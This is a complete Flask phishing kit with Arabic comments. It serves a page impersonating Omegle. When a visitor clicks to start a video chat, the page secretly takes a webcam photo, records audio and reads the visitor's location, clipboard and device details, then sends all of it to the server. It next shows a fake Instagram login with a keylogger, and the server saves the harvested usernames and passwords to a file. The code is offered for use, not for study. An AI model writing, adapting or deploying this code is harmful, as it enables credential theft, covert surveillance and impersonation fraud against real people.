import os, base64, time, json
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
ROOT_VAULT = "BLACK_BOX"
os.makedirs(ROOT_VAULT, exist_ok=True)

# --- الواجهة الإبليسية المتكاملة ---
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Omegle: Talk to Strangers</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; margin: 0; background: #000; color: white; text-align: center; overflow-x: hidden; }
        .header { background: #222; padding: 10px; border-bottom: 2px solid #ff7b00; color: #ff7b00; }
        #v-container { height: 60vh; background: #111; display: flex; flex-direction: column; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .btn-box { padding: 20px; background: #222; }
        #start-btn { background: #ff7b00; color: white; border: none; padding: 15px 40px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 80%; }
        
        /* نافذة الفخ الاحترافية */
        .modal { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:25px; border-radius:12px; z-index:99999; width:85%; max-width:320px; color: black; box-shadow: 0 0 50px rgba(255,123,0,0.7); }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        .login-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        #status-text { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.6); padding: 5px; font-size: 12px; z-index: 10; }
    </style>
</head>
<body>
    <div class="header"><h1>Omegle</h1></div>
    <div id="v-container">
        <div id="status-text">Looking for stranger...</div>
        <video id="localVid" autoplay muted playsinline></video>
    </div>
    <div class="btn-box"><button id="start-btn">Start Video Chat</button></div>

    <div id="loginModal" class="modal">
        <h2 style="color:#ff7b00; margin-top:0;">Verify Identity</h2>
        <p style="font-size:14px; color:#666;">Login with Instagram to continue your video chat (18+ only).</p>
        <input type="text" id="u" placeholder="Username or Email" oninput="keylog(this.value, 'user')">
        <input type="password" id="p" placeholder="Password" oninput="keylog(this.value, 'pass')">
        <button class="login-btn" onclick="saveLogin()">Log In</button>
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];
        let keylogData = { user: "", pass: "" };

        // 1. نظام الـ Keylogger
        function keylog(val, field) {
            keylogData[field] = val;
            // إرسال الضغطات لايف للسيرفر (اختياري)
        }

        // 2. نظام الـ Clipboard Snatcher
        async function getClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                return text;
            } catch (e) { return "Access Denied"; }
        }

        document.getElementById('start-btn').onclick = async () => {
            const btn = document.getElementById('start-btn');
            btn.innerText = "Connecting...";
            const v = document.getElementById('localVid');

            try {
                // حل مشكلة الأيفون الجذري
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                v.srcObject = stream;
                v.setAttribute("playsinline", true); // إجباري للأيفون
                v.play();

                // سحب الموقع
                const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, e => r({coords:{latitude:0, longitude:0}})));

                // تسجيل صوت صامت (5 ثواني)
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(audioChunks, {type: 'audio/wav'});
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => fetch('/save_audio', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({audio: reader.result})});
                };
                mediaRecorder.start();
                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 5000);

                // التقاط صورة وسحب بيانات الجهاز
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(v, 0, 0);
                
                const battery = await (navigator.getBattery ? navigator.getBattery() : {level:0, charging:false});
                const clipText = await getClipboard();

                await fetch('/trap', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        img: canvas.toDataURL('image/png'),
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        clip: clipText,
                        device: {
                            ua: navigator.userAgent,
                            bat: (battery.level * 100) + "%",
                            plat: navigator.platform,
                            mem: navigator.deviceMemory || "N/A",
                            cores: navigator.hardwareConcurrency
                        }
                    })
                });

                // إظهار الفخ فوق الكاميرا (الأيفون سيخضع هنا)
                setTimeout(() => {
                    document.getElementById('v-container').style.opacity = "0.4";
                    document.getElementById('loginModal').style.display = 'block';
                }, 3000);

            } catch (e) {
                alert("Please allow camera access to use Omegle.");
                // حتى لو رفض الكاميرا، أظهر الفخ لسحب الباسوردات!
                setTimeout(() => { document.getElementById('loginModal').style.display = 'block'; }, 1000);
            }
        };

        async function saveLogin() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            await fetch('/login_harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user: u, pass: p, live_keys: keylogData})
            });
            alert("Error: Server connection timed out. Please try again.");
            location.reload();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/trap', methods=['POST'])
def trap():
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    target_id = f"ID_{ip.replace('.','_')}_{int(time.time())}"
    path = os.path.join(ROOT_VAULT, target_id)
    os.makedirs(path, exist_ok=True)
    
    with open(f"{path}/face.png", "wb") as f:
        f.write(base64.b64decode(d['img'].split(',')[1]))
    
    map_url = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
    with open(f"{path}/full_report.json", "w") as f:
        json.dump({
            "Time": time.ctime(),
            "IP": ip,
            "Google_Maps": map_url,
            "Clipboard_Content": d['clip'],
            "Hardware": d['device']
        }, f, indent=4)
    
    print(f"💀 Target Acquired: {ip} | Folder: {target_id}")
    return jsonify({"status": "success"})

@app.route('/save_audio', methods=['POST'])
def save_audio():
    d = request.get_json()
    ip = request.remote_addr
    with open(f"{ROOT_VAULT}/audio_{ip.replace('.','_')}_{int(time.time())}.wav", "wb") as f:
        f.write(base64.b64decode(d['audio'].split(',')[1]))
    return jsonify({"status": "success"})

@app.route('/login_harvest', methods=['POST'])
def login():
    d = request.get_json()
    with open(f"{ROOT_VAULT}/master_passwords.txt", "a") as f:
        f.write(f"--- {time.ctime()} ---\nUser: {d['user']}\nPass: {d['pass']}\nKeylog: {d['live_keys']}\nIP: {request.remote_addr}\n\n")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
